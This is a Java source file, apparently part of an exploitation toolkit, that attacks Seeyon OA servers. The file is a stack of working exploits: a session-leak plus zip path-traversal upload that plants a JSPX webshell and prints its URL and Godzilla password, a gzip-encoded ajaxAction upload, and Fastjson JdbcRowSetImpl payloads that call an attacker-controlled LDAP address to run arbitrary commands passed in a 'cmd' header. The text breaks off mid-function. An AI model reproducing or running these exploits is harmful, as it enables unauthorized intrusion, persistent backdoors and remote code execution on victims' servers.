package com.akkacloud.core;

import com.akkacloud.gui.OAController;
import com.akkacloud.utils.*;
import javafx.application.Platform;


import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import static com.akkacloud.utils.ZIPUtil.writeShellZip;

public class SeeyonOACheck {




    /*1.SeeyonOA_Session_Divulge_Upload_Getshell*/
    public static StringBuilder Session_Divulge_Upload_VULcheck(String httpurl,String uploadFile,String shellContent){
        StringBuilder vulInfo = new StringBuilder();

        vulInfo.append("----------------------------------------------------------\r\n");
        vulInfo.append("[+]检查SeeyonOA_Session_Divulge_Upload_Getshell漏洞\r\n");
        String target = "";
        String urlshellname = "";
        if (NetworkUtil.isOk(httpurl)){
            try {
                target= CommonsUtils.normizeUrl(httpurl) +CommonsUtils.normizePath("/seeyon/thirdpartyController.do");//标准化输入
                long timestamp = System.currentTimeMillis();
                String shellname = "../"+timestamp+"akka.jspx";//压缩包里的文件
                urlshellname = timestamp+"akka.jspx";
                writeShellZip(shellContent, shellname, uploadFile);
            } catch (IOException e) {
                e.printStackTrace();
            } catch (Exception e) {
                e.printStackTrace();
            }

            Map<String,String> Headers =new HashMap<String,String>();
            Headers.put("Content-Type","application/x-www-form-urlencoded");
            Headers.put("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
            String data ="method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1";
            HashMap<String, Object> respHeader = HttpsUtils.sendPost(target, data, Headers);
            Map<String,List<String>> headerFields = (Map<String, List<String>>) respHeader.get("headerFields");
            try{
                String cookie = headerFields.get("Set-Cookie").get(0).split(";")[0];
                /*String resp = HttpsUtils.sendPost(target, data, true, Headers);*/
                if(cookie!=null||cookie.equals("")){
                    System.out.println("[+] The administrator cookie: "+cookie);
                    vulInfo.append("[+] The administrator cookie: "+cookie+"\r\n");
                    String targeturl = CommonsUtils.normizeUrl(httpurl) + CommonsUtils.normizePath("/seeyon/fileUpload.do?method=processUpload");
                    HashMap<String, String> header = new HashMap<>();
                    header.put("Cookie", cookie);

                    HashMap<String, String> params = new HashMap<>();
                    params.put("callMethod", "resizeLayout");
                    params.put("firstSave", "true");
                    params.put("takeOver", "false");
                    params.put("type", "0");
                    params.put("isEncrypt", "0");
                    String resp = HttpsUtils.uploadFile(targeturl, true, header, params,uploadFile);
                    if (!resp.contains("fileurls=fileurls+\",\"+'")){
                        System.out.println("[-] fileurls match failed！");
                        vulInfo.append("[-] fileurls match failed！\r\n[-]不存在Session_Divulge_Upload_VULcheck漏洞\r\n");
                    }
                    String rgex = "fileurls\\+\"\\,\"\\+\\'(.*?)\\'\\;";
                    String fileid = RexUtil.getSubUtilSimple(resp, rgex);
                    System.out.println("[+] fileurlsid:"+fileid);
                    vulInfo.append("[+] fileurlsid:"+fileid+"\r\n");
                    Date date = new Date();
                    SimpleDateFormat dateFormat= new SimpleDateFormat("yyyy-MM-dd");
                    String datestr = dateFormat.format(date);

                    String poststr = "method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment&arguments=%5B0%2C%22"+datestr+"%22%2C%22"+fileid+"%22%5D";
                    HashMap<String, String> header1 = new HashMap<>();
                    header1.put("Content-Type", "application/x-www-form-urlencoded");
                    header1.put("Cookie", cookie);
                    String targeturl1 =CommonsUtils.normizeUrl(httpurl) + CommonsUtils.normizePath("/seeyon/ajax.do");
                    HashMap<String, Object> response = HttpsUtils.sendPost(targeturl1, poststr, header1);
                    String respBody = (String) response.get("RespBody");
                    Integer code = (Integer) response.get("Code");
                    String shell_url=CommonsUtils.normizeUrl(httpurl)+CommonsUtils.normizePath("/seeyon/common/designer/pageLayout/")+urlshellname;
                    if(respBody.contains("Error on")&&code==500&&NetworkUtil.isOk(shell_url)){
                        System.out.println("[+] File Uploaded Successfully！");
                        System.out.println("[+] Webshell:"+shell_url);
                        vulInfo.append("[+] File Uploaded Successfully！"+"\r\n");
                        vulInfo.append("[+] Webshell:"+shell_url+"\r\n"+"[+]哥斯拉4.01 、加密器为JAVA_AES_RAW、秘钥为key、密码为pass\r\n");
                        return vulInfo;
                    }else {
                        System.out.println("[-] Failed to upload file！");
                        vulInfo.append("[-] Failed to upload file！"+"\r\n[-]不存在Session_Divulge_Upload_VULcheck漏洞\r\n");
                        return vulInfo;
                    }

                }else {
                    System.out.println("[-] Failed to get administrator cookie！");
                    vulInfo.append("[-] Failed to get administrator cookie！"+"\r\n[-]不存在Session_Divulge_Upload_VULcheck漏洞\r\n");
                    return vulInfo;
                }
            } catch (Exception e) {
                e.printStackTrace();
                vulInfo.append("[-] Failed to get administrator cookie！"+"\r\n[-]不存在Session_Divulge_Upload_VULcheck漏洞\r\n");
                return vulInfo;
            }
        }else {
            System.out.println("url链接不通，格式是https://www.baidu.com");
            vulInfo.append("url链接不通，格式是https://www.baidu.com"+"\r\n[-]不存在Session_Divulge_Upload_VULcheck漏洞\r\n");
            return vulInfo;
        }
    }

    /*2.SeeyonOA_ajaxAction_Upload_GetShell*/
    public static StringBuilder SeeyonOA_ajaxAction_Upload_GetShell(String httpurl) throws Exception {
        Map<String, String> proxy = OAController.Proxy;
        StringBuilder vulInfo = new StringBuilder();
        vulInfo.append("----------------------------------------------------------\r\n");
        vulInfo.append("[+]检查SeeyonOA_ajaxAction_Upload_GetShell漏洞\r\n");
        String target = "";
        if (NetworkUtil.isOk(httpurl)){
            //哥斯拉4.01 、加密器为JAVA_AES_RAW、秘钥为key、密码为pass*、url为http://127.0.0.1/seeyon/testak.jspx
            target = CommonsUtils.normizeUrl(httpurl) +CommonsUtils.normizePath("/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip");
            if(NetworkUtil.isOk(target)){
                vulInfo.append("[+]url:"+target+" 存在！"+ "\r\n");
                System.out.println("[+]url:"+target+" 存在！");
            }
            Map<String,String> Headers =new HashMap<String,String>();
            String data = "managerMethod=validate&arguments=%1F%C2%8B%08%00%07j%C2%9Fb%00%C3%BF%C2%8DV%C3%9B%C2%93%C2%9AN%16%7E%C3%BF%C3%BD%15%C3%96%C2%BC%C3%8C%C2%A4%C2%925%2DJf%C3%9CT%1E%06%C2%94%16PFE%C2%AE%5B%C3%BB%00%C3%9D%08hs%C3%89%00%0A%C2%A6%C3%B2%C2%BF%C3%A7%00%263%C2%B9lj%C2%AD%C2%B2%C2%80%C3%A6%C3%9C%C3%BA%C3%BB%C2%BE%C3%93%C2%87%C3%BF%7C%C2%B9%C3%9Dg%C3%8FI%C3%85%C2%BC%5D%C2%93%07%C2%B7%C3%BF%1E%C2%8C%C3%9E%0D%C2%BE%C2%AFh%5E%C3%92%C2%AE%C3%9C%C2%96AQ%C3%9E%C2%BE%2C%C3%8F%C3%AB%C3%BC9%28%C2%8A8K%C3%9B%C2%97z%C3%B9%1C%C2%A7%C3%A1%20%C3%B7%C3%8Ah%C3%B0ip3%1C%C2%BE%3F%07%C2%BE%C2%97%C3%A7%C3%85%C3%BB%22%08%C2%9A%2C%7D%7F%C3%B3%C3%B1%C2%9F%C3%81%C3%B5w%C3%B0N%C3%9E0%C3%8E%C2%86kp%29%C2%AD%C3%A7%C2%B8%0C%C2%9E%07%C3%B9%C3%8B%3D%07%01%C3%92%C3%A0%C3%BC%27%C2%B3%C2%BB6%C3%BE%C3%9B%C2%9B%C2%B6%12%C3%AF8%3C%14y%7D%C3%B3%C3%A6%25%C3%AE%C2%B5%C2%86%22%0A%18k%C2%8BX%C3%A3%C3%BCBfy%C3%A3sS%24%2F%C2%A2%C3%92%C3%87%C3%BC%C3%A5%29i%C3%97P%C3%AC%2D%C2%B6%C2%88%C3%8C%C2%B2%C3%93%C2%92%C3%8B%23%C2%9A%C3%8C%2B26%C2%ABe%C2%A2%C2%9D%7C%7D%C2%AA%1A%C2%A3%C3%87%C2%93%C2%81%C2%A5%C3%94%C3%95%C3%A5%C2%90%26fC8v%C3%B2%0F%28%5E%C3%A9%C2%93F%3EL%1E%C2%BCT%3B%3F%25%5B%C3%A6puD%12%09y%C3%96%C2%B4Z%C3%87%C3%82%C2%8E%2E%C2%94%C3%9COH%18%C3%A0%C3%95T%3Eh%07%2D1%C3%8E%C3%8E%21%C2%8A%C2%9E%C2%ACU%C2%AD%C3%AD%C3%A4F%C3%83%C3%B3%C3%B8%C2%A9%11%0E%3E%C2%96%2E%C2%A4%11%1C%19%C2%9B%13%C2%8A%C3%8D%C3%8A%5D%C2%AC%C3%82M%1Bk%C2%AC%C2%AD%7CN%3A%C2%BA%C2%B6rO%16f%C3%ACcv%C2%90%C2%A50%C3%BB%C3%B9%C2%9D%1C%061%C2%BB%C2%87z%C3%8Fp%C2%9F%05%C3%B1%C3%B1%7Eo%0B%23%27%C2%A9s%C2%A7%11f%C3%97%C3%98%5B%15%2B%3C%C3%84%C3%B6m%5D88%C2%AD%7Db%22j%2B%C2%95%C2%BC%C3%90F%04%C2%9B%C3%8D%12%C3%AAw%13V%C2%B9%C2%86V8%C2%B6vQ%C2%B1%16%2F%C3%85%C3%87%C3%B3Rl%C3%AD%C3%B9%C3%82%C2%B5%C3%B8%C2%94%C3%A20%7F%1A%C2%A3%C3%B0U%C3%BC8%C2%B0%C2%B7%C3%8C%1A%C2%A10%10%C2%A3%1F%C3%B7%C2%A4%C2%A9c%C3%80%18%7C%C2%A4J%C3%86%28%0F%1A%01%C2%91%C2%94%C3%9D%7B%C2%89%C3%849vX9c%C2%85%27%C2%8B%C3%ADiy%C3%94r%C2%82%23Fb%C3%A1%C2%B0%C2%B6Z%C3%9C%C2%A5%09%60%C3%9E%04%C2%B6%C2%80%C3%BC%C2%86%C2%9Fy%C2%B6%C2%90%C3%81%C2%9E%2A%C2%973%C2%91n%C3%B1%17%C2%8A%C2%A5%C3%8A%C3%A1%C2%8CL%3EJ%C2%92%C3%91%C3%88%C3%B9%13%C2%B7%C2%AA%3C%C2%8B%C3%8F%C2%A9%18%C2%95%C3%AB%C3%8B%C3%BC%C3%83%2A%C2%AE%2B%C3%97%26%C3%A1oy%C2%80%1F%C3%97ZU%06g%1E%C3%9A%7D%C3%AB%C2%9C%C3%89%1Bc%C2%819M4q%1A%3Eu%C3%AD%C2%AD%C3%98%C3%96N%C2%9A0%5F%C2%8A%C2%8A%C2%B05W%C2%B1%C2%AA%1F%5F0%C3%82%C2%AB%C3%8A%C3%85S%0C%C2%B9%22%5F%C2%8C%2E%C3%AA%C2%AE%08%C3%B7%C2%96%16Q%C2%ACe%C2%B2%18I%01%C3%96%18%C3%A4%C3%89%7Dn%12%C2%BA%C3%BA%2Bl1%3F%C3%B2%C3%B1%C3%B9%5E%5E%C2%8C%C2%A6%C3%A2%C3%A1%7C%C3%BA%C2%A3N%0E%C3%B5g2%7E%C3%BC%408%C2%AD%C2%81%C3%BD%22%1F%C2%9Bh%C2%9Dn%01%C2%83%C3%B2%07%C2%9E%2E%C2%96%C2%90%C2%B3%1Bu%7BsR%C2%86%5C%C2%B3T%C3%BC%14%C3%B8%C3%A2%C2%80%C2%B7T%C2%88H%C2%AA1%C3%80%07%C2%A9%0B%C2%85%11%C3%9Bdd%C2%BC%C3%A91%C3%83f%C3%A4%02%C2%B7%C2%AA%C2%A8%C3%8C%7C%C2%8EG%C3%80%21Z%1A5%C3%B3%13%C2%8A%3CQ%C3%8EU%13%C3%B5%C2%9C%C3%A8%7C%0ExCLaD%25%0DA%C3%BD%C2%91%C2%AF%0B%C3%B9O%C3%8F%3B%C3%A051kj%C2%99%17%2Av%C2%98%C3%BDb%0F%C3%9A%C3%A0XEEa%C3%AF%C2%A7f%C2%B9%C3%9E%3D%C3%9ES%2E%C3%8A%7Dl%C2%84%C2%AA%18uk%C3%AAe%C3%B4sL%C2%9Do%40%23G%15o%01%C3%8Byas%C2%80%C2%97%5E%1F%1D%7B%1B%2D%C2%93%C3%AFu%1Es%25%C2%A9%C3%91%13%C3%97%C3%99T%C2%80O%C3%A5%C2%8E%C2%B7%C2%99%C2%BA%2B%3B%C2%BB%C2%B5%1Df%1D%3E%C3%BA9t%13%C2%A9%20%C2%9C%C3%91%C3%96%C2%91%00%2F%17%17t%C3%9Cb%C2%BCL%28%C2%A3s%09%C2%B5%C3%BD%C3%A8%C2%A4%26r%C3%B50%26X%C3%A2%7D%3C%C2%8D%5C%C3%80a%0D%C3%98R%C2%AB%2ET%C2%BB%7C%C3%B1%01L%C3%BF%C3%A2S%C3%B8%C2%899n%7B%C2%91%C3%A2%28%27%C2%BD%C2%86%C2%AE%C2%BD%06%1A%C3%AA%C3%B2%C3%B5%7D%C2%B4k%C3%AD%3B%0E%C2%8E%C3%B9%C2%92%C3%8D%C2%AF%C2%B5%1E%C2%A1%C2%8FF%C3%8C%5Fh%2C%18%C2%BFpF%C2%80%C2%B3%C2%8D%0D%C3%A7P%C3%82b%0A%C3%9C%03og%C3%87V%22%C3%9F%C2%82%C3%BC%C2%B6r%C2%91c%C3%98c%C3%AF%7F%C2%BF%C3%A3%C2%94%C3%8F%C2%AE%C2%A5%21%19%3BS%C3%80%C3%B7%C2%9A%C2%9B%C3%BD%C3%9F%7BVu%1E%C3%B4D%C2%81C%0D9%16%7F%C2%80%C3%B7%C2%80%5B%7F%C3%B6y%C3%96C%C2%B5iufH%0D%C3%A8%C2%94%C3%9F%C2%8DM%04%C3%A7%0F2%C3%86%C3%9B%C2%96%C2%AFR%C3%86%C2%B0%7E%C2%9C%C2%8E%C3%A8%C2%AC%C3%97%C3%A4%2B%0Du%7D%C2%B4%C2%B1%C2%95%C3%86%C2%B1%C3%99%1A%C3%B6p%C2%86%7F%7B%0E2%C3%87B%2Dg%C3%89%C2%B2%C3%93%10%C3%B0%C3%94D%C2%A0%5B%05l6%C2%90%C3%97%C2%818%C3%92%C3%88%C2%B1%C3%AA%C2%8B%C2%BA%10%22%C3%90n%C2%AFW%3BB%C2%9DO%C2%BA%3D%C2%B5%C2%B9%C2%A1%C3%BFR%C3%80%C2%B1%C3%AD%C2%AF%0B%C3%81S%C3%80%C3%8B%C3%A8t%C3%BEk%7D%60S%C3%91%C2%B1%C2%92Sldp%2E%7D%C3%8FSQ%3C%7DU%C3%9F1SA3P%C3%9B%C3%88%C3%AD%C3%B8%C2%80s%C3%AD%2F%3D%C2%BD%C3%9Fd%0F0%1B%C3%9A%C3%B9q%C2%81s%25%C2%87w%C2%85ko%C3%9E%C2%AE%C3%85i%C3%9F%C2%BF%C3%89%C3%B4Dg%C2%93O%C2%AF%C3%86ZQ%C2%A5%C3%83%24%2E%C3%88Px%C3%94%C3%A7%1F%26%C2%B3%C2%80d%14%26%1B%C2%BD%5E%C3%BB%C2%A1%C3%B6g%C2%A3%C2%BB%C3%9F%C2%A7X%C3%AFv%7D%C3%A8%7D%C3%BB%C2%87%C2%BBk%C3%80a%7F%15%C2%AA%C3%BD%1E%02tC%C3%AF%C3%8D%C2%BB%1Bc%27%C3%BD%C3%AB%C3%A1%C3%B5P%7C%3DX%C2%87%C3%9D%03K%C2%AF%21%C3%BAx%C3%BF%C3%8B%C2%96%C2%B0%C2%AC%08%C2%A0%C2%B0%C2%AF%1F%C3%9Bq%0B74%C3%98%0F%60%C3%AE%C2%961%19%C3%94u%7D%C3%B7%C3%A6%C3%8B%C3%ADW%C3%B8%1A%C2%80%2F%C2%82%2F%C3%AD%C2%B5%7C%C2%AE%C2%82%C3%9B%C3%BF%7E%03%C3%87%C2%B6%C2%8A%00H%08%00%00";
            HashMap<String, Object> response = HttpsUtils.sendPost(target, data, Headers);
            Integer RespCode = (Integer) response.get("Code");
            String RespResult = (String) response.get("RespBody");

            String shellurl=CommonsUtils.normizeUrl(httpurl) +CommonsUtils.normizePath("/seeyon/testak.jspx");
            if (RespCode==500&&RespResult.contains("message\":null")&&NetworkUtil.isOk(shellurl)){
                vulInfo.append("[+]上传webshell成功,地址：" + shellurl + "\r\n"+"哥斯拉4.01 、加密器为JAVA_AES_RAW、秘钥为key、密码为pass");
                System.out.println("[+]上传webshell成功,地址：" + shellurl+ "\r\n"+"[+]哥斯拉4.01 、加密器为JAVA_AES_RAW、秘钥为key、密码为pass");
                return vulInfo;
            }else {
                vulInfo.append("[-]上传失败" + "\r\n[-]不存在SeeyonOA_ajaxAction_Upload_GetShell漏洞\r\n");
                System.out.println("[-]上传失败");

                return vulInfo;
            }


        }else {
            vulInfo.append("[-]链接失败" + "\r\n[-]不存在SeeyonOA_ajaxAction_Upload_GetShell漏洞\r\n");
            System.out.println("[-]链接失败");
            return vulInfo;
        }

    }

    /*3.SeeyonOA_Fastjson_SursenServlet_Rce*/
    public static StringBuilder SeeyonOA_Fastjson_SursenServlet_Rce_Check(String httpurl) throws Exception {
        StringBuilder vulInfo = new StringBuilder();
        vulInfo.append("----------------------------------------------------------\r\n");
        vulInfo.append("[+]检查SeeyonOA_Fastjson_SursenServlet_Rce漏洞\r\n");
        /*请求dnslog*/
        String dnslog = DnslogDomain.getDnslog();
        String[] split = dnslog.split(";");
        String cookie = split[0];
        String ldapAdr = "ldap://"+split[1];

        /*调用漏洞攻击*/
        String target = CommonsUtils.normizeUrl(httpurl) +CommonsUtils.normizePath("/seeyon/sursenServlet");
        if(NetworkUtil.isOk(target)){
            vulInfo.append("[+]url:"+target+" 存在！"+ "\r\n");
            System.out.println("[+]url:"+target+" 存在！");
        }
        String data ="sursenData=%7B%22name%22%3A%7B%22%5Cu0040%5Cu0074%5Cu0079%5Cu0070%5Cu0065%22%3A%22%5Cu006a%5Cu0061%5Cu0076%5Cu0061%5Cu002e%5Cu006c%5Cu0061%5Cu006e%5Cu0067%5Cu002e%5Cu0043%5Cu006c%5Cu0061%5Cu0073%5Cu0073%22%2C%22%5Cu0076%5Cu0061%5Cu006c%22%3A%22%5Cu0063%5Cu006f%5Cu006d%5Cu002e%5Cu0073%5Cu0075%5Cu006e%5Cu002e%5Cu0072%5Cu006f%5Cu0077%5Cu0073%5Cu0065%5Cu0074%5Cu002e%5Cu004a%5Cu0064%5Cu0062%5Cu0063%5Cu0052%5Cu006f%5Cu0077%5Cu0053%5Cu0065%5Cu0074%5Cu0049%5Cu006d%5Cu0070%5Cu006c%22%7D%2C%22x%22%3A%7B%22%5Cu0040%5Cu0074%5Cu0079%5Cu0070%5Cu0065%22%3A%22%5Cu0063%5Cu006f%5Cu006d%5Cu002e%5Cu0073%5Cu0075%5Cu006e%5Cu002e%5Cu0072%5Cu006f%5Cu0077%5Cu0073%5Cu0065%5Cu0074%5Cu002e%5Cu004a%5Cu0064%5Cu0062%5Cu0063%5Cu0052%5Cu006f%5Cu0077%5Cu0053%5Cu0065%5Cu0074%5Cu0049%5Cu006d%5Cu0070%5Cu006c%22%2C%22%5Cu0064%5Cu0061%5Cu0074%5Cu0061%5Cu0053%5Cu006f%5Cu0075%5Cu0072%5Cu0063%5Cu0065%5Cu004e%5Cu0061%5Cu006d%5Cu0065\":\""+ldapAdr+"\",\"autoCommit\":true}}";
        HashMap<String, String> Headers = new HashMap<>();
        HttpsUtils.sendPost(target, data, Headers);


        /*检查是否存在漏洞，判断是否返回页面是否有dns记录*/
        if (DnslogDomain.checkDnslog(cookie,split[1])){
            vulInfo.append("[+]存在SeeyonOA_Fastjson_SursenServlet_Rce漏洞\r\n[+]前往JNDI_RCE利用\r\n");
            System.out.println("存在漏洞");
        }else {
            vulInfo.append("[-]不存在SeeyonOA_Fastjson_SursenServlet_Rce漏洞\r\n");
            System.out.println("不存在漏洞");
        }

        return vulInfo;
    }

    public static StringBuilder SeeyonOA_Fastjson_SursenServlet_Rce(String httpurl,String ldapAdr) throws Exception {
        return SeeyonOA_Fastjson_SursenServlet_Rce(httpurl,ldapAdr,null);
    }

    public static StringBuilder SeeyonOA_Fastjson_SursenServlet_Rce(String httpurl,String ldapAdr,String Command) throws Exception {
        return SeeyonOA_Fastjson_SursenServlet_Rce(httpurl,ldapAdr,Command,null);
    }

    public static StringBuilder SeeyonOA_Fastjson_SursenServlet_Rce(String httpurl,String ldapAdr,String Command,String Encoding) throws Exception {
        Map<String, String> proxy = OAController.Proxy;
        StringBuilder vulInfo = new StringBuilder();
        String target = "";
        if (NetworkUtil.isOk(httpurl)){
            target = CommonsUtils.normizeUrl(httpurl) +CommonsUtils.normizePath("/seeyon/sursenServlet");
            Map<String,String> Headers =new HashMap<String,String>();
            if(Command==null||Command.equals("")){
                Headers.put("cmd", "echo successExec");
            }else {
                Headers.put("cmd", "echo successExec&&"+Command);
            }
            if(Encoding==null||Encoding.equals("")){
                Encoding="UTF-8";
            }
            String data ="sursenData=%7B%22name%22%3A%7B%22%5Cu0040%5Cu0074%5Cu0079%5Cu0070%5Cu0065%22%3A%22%5Cu006a%5Cu0061%5Cu0076%5Cu0061%5Cu002e%5Cu006c%5Cu0061%5Cu006e%5Cu0067%5Cu002e%5Cu0043%5Cu006c%5Cu0061%5Cu0073%5Cu0073%22%2C%22%5Cu0076%5Cu0061%5Cu006c%22%3A%22%5Cu0063%5Cu006f%5Cu006d%5Cu002e%5Cu0073%5Cu0075%5Cu006e%5Cu002e%5Cu0072%5Cu006f%5Cu0077%5Cu0073%5Cu0065%5Cu0074%5Cu002e%5Cu004a%5Cu0064%5Cu0062%5Cu0063%5Cu0052%5Cu006f%5Cu0077%5Cu0053%5Cu0065%5Cu0074%5Cu0049%5Cu006d%5Cu0070%5Cu006c%22%7D%2C%22x%22%3A%7B%22%5Cu0040%5Cu0074%5Cu0079%5Cu0070%5Cu0065%22%3A%22%5Cu0063%5Cu006f%5Cu006d%5Cu002e%5Cu0073%5Cu0075%5Cu006e%5Cu002e%5Cu0072%5Cu006f%5Cu0077%5Cu0073%5Cu0065%5Cu0074%5Cu002e%5Cu004a%5Cu0064%5Cu0062%5Cu0063%5Cu0052%5Cu006f%5Cu0077%5Cu0053%5Cu0065%5Cu0074%5Cu0049%5Cu006d%5Cu0070%5Cu006c%22%2C%22%5Cu0064%5Cu0061%5Cu0074%5Cu0061%5Cu0053%5Cu006f%5Cu0075%5Cu0072%5Cu0063%5Cu0065%5Cu004e%5Cu0061%5Cu006d%5Cu0065\":\""+ldapAdr+"\",\"autoCommit\":true}}";
            HashMap<String, Object> resp = HttpsUtils.sendPost(target, data, Headers,Encoding);
            String respBody = (String) resp.get("RespBody");
            Integer statusCode = (Integer) resp.get("Code");
            if (respBody.contains("successExec")&&statusCode==200){
                vulInfo.append("[+]存在SeeyonOA_Fastjson_SursenServlet_Rce漏洞\r\n");
                vulInfo.append("-------------------Command—Result-------------------\r\n");
                vulInfo.append(respBody);
                vulInfo.append("\r\n-------------------Command—Result-------------------\r\n\r\n");
                System.out.println("[+]存在SeeyonOA_Fastjson_SursenServlet_Rce漏洞\r\n");
                System.out.println(respBody);
                return vulInfo;
            }else {
                vulInfo.append("[-]不存在SeeyonOA_Fastjson_SursenServlet_Rce漏洞" + "\r\n");
                System.out.println("[-]不存在SeeyonOA_Fastjson_SursenServlet_Rce漏洞");
                return vulInfo;
            }

        }else {
            vulInfo.append("[-]链接失败" + "\r\n[+]不存在SeeyonOA_Fastjson_SursenServlet_Rce漏洞\r\n");
            System.out.println("[-]链接失败");
            return vulInfo;
        }

    }


    /*4.SeeyonOA_Fastjson_ChangeLocale_Rce*/
    public static StringBuilder SeeyonOA_Fastjson_ChangeLocale_Rce_Check(String httpurl) throws Exception {

        StringBuilder vulInfo = new StringBuilder();
        vulInfo.append("----------------------------------------------------------\r\n");
        vulInfo.append("[+]检查SeeyonOA_Fastjson_ChangeLocale_Rce漏洞\r\n");
        /*请求dnslog*/
        String dnslog = DnslogDomain.getDnslog();
        String[] split = dnslog.split(";");
        String cookie = split[0];
        String ldapAdr = "ldap://"+split[1];

        /*调用漏洞攻击*/
        String target = CommonsUtils.normizeUrl(httpurl) +CommonsUtils.normizePath("/seeyon/main.do?method=changeLocale");
        if(NetworkUtil.isOk(target)){
            vulInfo.append("[+]url:"+target+" 存在！"+ "\r\n");
            System.out.println("[+]url:"+target+" 存在！");
        }
        String data ="_json_params={\"name\":{\"\\u0040\\u0074\\u0079\\u0070\\u0065\":\"\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0043\\u006c\\u0061\\u0073\\u0073\",\"\\u0076\\u0061\\u006c\":\"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\"},\"x\":{\"\\u0040\\u0074\\u0079\\u0070\\u0065\":\"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\",\"\\u0064\\u0061\\u0074\\u0061\\u0053\\u006f\\u0075\\u0072\\u0063\\u0065\\u004e\\u0061\\u006d\\u0065\":\""+ldapAdr+"\",\"autoCommit\":true}}";
        HashMap<String, String> Headers = new HashMap<>();
        HttpsUtils.sendPost(target, data, Headers);


        /*检查是否存在漏洞，判断是否返回页面是否有dns记录*/
        if (DnslogDomain.checkDnslog(cookie,split[1])){
            vulInfo.append("[+]存在SeeyonOA_Fastjson_ChangeLocale_Rce\r\n[+]前往JNDI_RCE利用\r\n");
            System.out.println("存在漏洞");
        }else {
            vulInfo.append("[-]不存在SeeyonOA_Fastjson_ChangeLocale_Rce\r\n");

            System.out.println("不存在SeeyonOA_Fastjson_ChangeLocale_Rce");
        }

        return vulInfo;

    }

    public static StringBuilder SeeyonOA_Fastjson_ChangeLocale_Rce(String httpurl,String ldapAdr) throws Exception {
        return SeeyonOA_Fastjson_ChangeLocale_Rce(httpurl,ldapAdr,null);
    }

    public static StringBuilder SeeyonOA_Fastjson_ChangeLocale_Rce(String httpurl,String ldapAdr,String Command) throws Exception {
        return SeeyonOA_Fastjson_ChangeLocale_Rce(httpurl,ldapAdr,Command,null);
    }

    public static StringBuilder SeeyonOA_Fastjson_ChangeLocale_Rce(String httpurl,String ldapAdr,String Command,String Encoding) throws Exception {

        StringBuilder vulInfo = new StringBuilder();
        String target = "";
        if (NetworkUtil.isOk(httpurl)){
            target = CommonsUtils.normizeUrl(httpurl) +CommonsUtils.normizePath("/seeyon/main.do?method=changeLocale");
            Map<String,String> Headers =new HashMap<String,String>();
            if(Command==null||Command.equals("")){
                Headers.put("cmd", "echo successExec");
            }else {
                Headers.put("cmd", "echo successExec&&"+Command);
            }
            if(Encoding==null||Encoding.equals("")){
                Encoding="UTF-8";
            }
            String data ="_json_params={\"name\":{\"\\u0040\\u0074\\u0079\\u0070\\u0065\":\"\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0043\\u006c\\u0061\\u0073\\u0073\",\"\\u0076\\u0061\\u006c\":\"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\"},\"x\":{\"\\u0040\\u0074\\u0079\\u0070\\u0065\":\"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\",\"\\u0064\\u0061\\u0074\\u0061\\u0053\\u006f\\u0075\\u0072\\u0063\\u0065\\u004e\\u0061\\u006d\\u0065\":\""+ldapAdr+"\",\"autoCommit\":true}}";
            HashMap<String, Object> resp = HttpsUtils.sendPost(target, data, Headers,Encoding);
            String respBody = (String) resp.get("RespBody");
            Integer statusCode = (Integer) resp.get("Code");
            if (respBody.contains("successExec")){
                vulInfo.append("[+]存在SeeyonOA_Fastjson_ChangeLocale_Rce漏洞\r\n");
                vulInfo.append("-------------------Command—Result-------------------\r\n");
                vulInfo.append(respBody);
                vulInfo.append("\r\n-------------------Command—Result-------------------\r\n\r\n");
                System.out.println("[+]存在SeeyonOA_Fastjson_ChangeLocale_Rce漏洞\r\n");
                System.out.println(respBody);
                return vulInfo;
            }else {
                vulInfo.append("[-]不存在SeeyonOA_Fastjson_ChangeLocale_Rce漏洞\r\n");
                System.out.println("[-]不存在SeeyonOA_Fastjson_ChangeLocale_Rce漏洞");
                return vulInfo;
            }

        }else {
            vulInfo.append("[-]链接失败" + "\r\n[-]不存在SeeyonOA_Fastjson_ChangeLocale_Rce漏洞\r\n");
            System.out.println("[-]链接失败");
            return vulInfo;
        }
    }


    public static StringBuilder SeeyonOA_Htmlofficeservlet_Rce(String httpurl) throws Exception {
        StringBuilder vulInfo = new StringBuilder();
        vulInfo.append("----------------------------------------------------------\r\n");
        vulInfo.append("[+]检查SeeyonOA_Htmlofficeservlet_Rce漏洞\r\n");
        String target = CommonsUtils.normizeUrl(httpurl)+CommonsUtils.normizePath("/seeyon/htmlofficeservlet");
        HashMap<String, String> headers = new HashMap<>();
        headers.put("Pragma", "no-cache");
        headers.put("Cache-Control", "no-cache");
        headers.put("Upgrade-Insecure-Requests", "1");
        headers.put("Accept-Language", "zh-CN,zh;q=0.9");
        headers.put("Connection", "close");
        headers.put("Content-Length", "429");
